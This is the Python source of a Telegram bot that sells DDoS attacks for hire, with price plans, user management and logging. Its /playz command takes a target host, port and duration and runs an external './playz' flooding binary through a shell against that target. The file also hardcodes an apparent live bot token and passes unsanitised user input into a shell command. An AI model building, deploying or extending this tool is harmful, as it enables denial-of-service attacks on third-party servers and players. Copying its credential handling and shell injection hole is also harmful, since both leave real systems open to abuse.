import telebot
import subprocess
import requests
import datetime
import os
from keep_alive import keep_alive

keep_alive()
# Initialize the Telegram bot
bot = telebot.TeleBot('7325026268:AAEr4yePjWZN0uKZHyllUjiKsV0MZXiD0Fc')

# Admin user IDs
admin_id = ["6233223488"]
# File paths
USER_FILE = "users_file.txt"
LOG_FILE = "log.txt"



# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read user IDs from the file
def read_users(file_path):
    try:
        with open(file_path, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users(file_path):
    free_user_credits = {}
    try:
        with open(file_path, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass
    return free_user_credits

# File paths
USER_FILE = "user_file.txt"
FREE_USER_FILE = "free_user_file.txt"

# List to store allowed user IDs
allowed_user_ids = read_users(USER_FILE)

# Dictionary to store free user IDs and their credits
free_user_credits = read_free_users(FREE_USER_FILE)


# Function to log command to the file
def log_command(user_id, target, port, time):
    try:
        user_info = bot.get_chat(user_id)
        username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
        
        with open(LOG_FILE, "a") as file:
            file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
    except Exception as e:
        print(f"Error logging command: {str(e)}")



# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response


# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"

    try:
        with open(LOG_FILE, "a") as file:
            file.write(log_entry + "\n")
    except Exception as e:
        print(f"Error writing to log file: {str(e)}")


@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        response = "Only Admin Can Run This Command."
        bot.reply_to(message, response)
        return

    command = message.text.split()
    if len(command) > 1:
        user_to_add = command[1]
        if user_to_add not in allowed_user_ids:
            allowed_user_ids.append(user_to_add)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_to_add}\n")
            response = f"User {user_to_add} Added Successfully."
        else:
            response = "User already exists."
    else:
        response = "Please specify a user ID to add."

    bot.reply_to(message, response)




@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        response = "Only Admin Can Run This Command."
        bot.reply_to(message, response)
        return

    command = message.text.split()
    if len(command) > 1:
        user_to_remove = command[1]
        if user_to_remove in allowed_user_ids:
            allowed_user_ids.remove(user_to_remove)
            with open(USER_FILE, "w") as file:
                for user_id in allowed_user_ids:
                    file.write(f"{user_id}\n")
            response = f"User {user_to_remove} removed successfully."
        else:
            response = f"User {user_to_remove} not found in the list."
    else:
        response = "Please specify a user ID to remove.\nUsage: /remove <userid>"

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        response = "Only Admin Can Run This Command."
        bot.reply_to(message, response)
        return

    try:
        with open(LOG_FILE, "r+") as file:
            log_content = file.read()
            if log_content.strip() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs Cleared Successfully"
    except FileNotFoundError:
        response = "Logs are already cleared."

    bot.reply_to(message, response)


 
@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        response = "Only Admin Can Run This Command."
        bot.reply_to(message, response)
        return

    try:
        with open(USER_FILE, "r") as file:
            user_ids = file.read().splitlines()
            if user_ids:
                response = "Authorized Users:\n"
                for user_id in user_ids:
                    try:
                        user_info = bot.get_chat(int(user_id))
                        username = user_info.username
                        response += f"- @{username} (ID: {user_id})\n"
                    except Exception as e:
                        response += f"- User ID: {user_id}\n"
            else:
                response = "No authorized users found."
    except FileNotFoundError:
        response = "No data found."

    bot.reply_to(message, response)



@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        response = "Only Admin Can Run This Command."
        bot.reply_to(message, response)
        return

    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        try:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
        except FileNotFoundError:
            response = "No data found."
            bot.reply_to(message, response)
    else:
        response = "No data found"
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your Telegram ID: {user_id}"
    bot.reply_to(message, response)


# Function to handle the reply when free users run the /playz command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    response = f"""
    {username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.

    𝐓𝐚𝐫𝐠𝐞𝐭: {target}
    𝐏𝐨𝐫𝐭: {port}
    𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬
    𝐌𝐞𝐭𝐡𝐨𝐝: Playz

    By Shubham Playz
    """
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /playz command
playz_cooldown = {}


@bot.message_handler(commands=['playz'])
def handle_playz(message):
    user_id = str(message.chat.id)

    if user_id not in allowed_user_ids:
        response = "You Are Not Authorized To Use This Command."
        bot.reply_to(message, response)
        return

    if user_id not in admin_id and user_id in playz_cooldown and (datetime.datetime.now() - playz_cooldown[user_id]).seconds < 300:
        response = "You Are On Cooldown. Please Wait 5min Before Running The /playz Command Again."
        bot.reply_to(message, response)
        return

    playz_cooldown[user_id] = datetime.datetime.now()

    command = message.text.split()
    if len(command) == 4:
        try:
            target = command[1]
            port = int(command[2])
            time = int(command[3])

            if time > 5000:
                response = "Error: Time interval must be less than 5000."
            else:
                record_command_logs(user_id, '/playz', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)
                full_command = f"./playz {target} {port} {time} 250"
                subprocess.run(full_command, shell=True)
                response = f"Playz Attack Finished. Target: {target} Port: {port} Time: {time}"
        except ValueError:
            response = "Error: Port and time must be integers."
    else:
        response = "Usage: /playz <target> <port> <time>\nExample: /playz example.com XXXXX 300"
        
    bot.reply_to(message, response)



@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "You Are Not Authorized To Use This Command.")
        return

    try:
        with open(LOG_FILE, "r") as file:
            command_logs = file.readlines()
            user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
            if user_logs:
                response = "Your Command Logs:\n" + "".join(user_logs)
            else:
                response = "No Command Logs Found For You."
    except FileNotFoundError:
        response = "No command logs found."

    bot.reply_to(message, response)



@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = """
    *Available Commands:*
    - `/bgmi` : Method For BGMI Servers.
    - `/rules` : Please Check Before Use!!
    - `/mylogs` : To Check Your Recent Attacks.
    - `/plan` : Check Out Our Botnet Rates.

    *To See Admin Commands:*
    - `/admincmd` : Shows All Admin Commands.

    _By Shubham Playz
    """
    bot.reply_to(message, help_text)


@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"""
    *Welcome to Your Home, {user_name}!*

    Feel free to explore and make use of our features.
    
    Try running this command: `/help` for more information.
    
    Welcome to the world's best DDOS bot!

    _By Shubham Playz_
    """
    bot.reply_to(message, response)



@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f"""
    *{user_name}, Please Follow These Rules:*

    1. **Do Not Run Too Many Attacks**: Excessive attacks can result in a ban from the bot.
    2. **Do Not Run Multiple Attacks Simultaneously**: Running two attacks at the same time will lead to a ban.
    3. **Log Monitoring**: We check the logs daily, so please follow these rules to avoid being banned.

    _By Shubham Playz_
    """
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f"""
    *{user_name}, Our VIP Plan is More Powerful Than Any Other DDOS!*

    **VIP Plan Details:**
    - **Attack Time**: 200 seconds
    - **Cooldown**: 2 minutes after each attack
    - **Concurrent Attacks**: 300

    **Price List:**
    - **Day**: 150 Rs
    - **Week**: 900 Rs
    - **Month**: 1600 Rs

    _By Shubham Playz
    """
    bot.reply_to(message, response)


@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f"""
    *{user_name}, Admin Commands Are Here!!*

    **User Management:**
    `/add <userId>` : Add a user.
    `/remove <userId>` : Remove a user.
    `/allusers` : List all authorized users.

    **Logs:**
    `/logs` : View all user logs.
    `/clearlogs` : Clear the logs file.

    **Broadcast:**
    `/broadcast <message>` : Broadcast a message to all users.

    _By Shubham Playz_
    """
    bot.reply_to(message, response)



@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "Only Admin Can Run This Command.")
        return

    command = message.text.split(maxsplit=1)
    if len(command) <= 1:
        bot.reply_to(message, "Please Provide A Message To Broadcast.")
        return

    message_to_broadcast = f"Message To All Users By Admin:\n\n{command[1]}"
    
    try:
        with open(USER_FILE, "r") as file:
            user_ids = file.read().splitlines()
    except Exception as e:
        bot.reply_to(message, f"Failed to read user file: {str(e)}")
        return

    successful_count = 0
    failed_count = 0
    
    for user_id in user_ids:
        try:
            bot.send_message(user_id, message_to_broadcast)
            successful_count += 1
        except Exception as e:
            print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            failed_count += 1
    
    response = f"Broadcast Message Sent Successfully To {successful_count} Users."
    if failed_count > 0:
        response += f" Failed to send to {failed_count} users."
    
    bot.reply_to(message, response)


bot.polling()
